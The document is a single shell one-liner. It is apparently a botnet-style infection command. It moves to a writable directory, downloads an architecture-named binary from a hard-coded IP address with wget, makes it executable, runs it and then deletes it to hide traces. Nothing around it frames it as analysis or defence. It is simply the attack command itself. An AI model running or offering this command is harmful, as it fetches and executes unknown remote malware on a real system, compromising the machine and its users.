cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://198.167.140.21/[cpu]; chmod +x [cpu]; ./[cpu]; rm -rf [cpu]
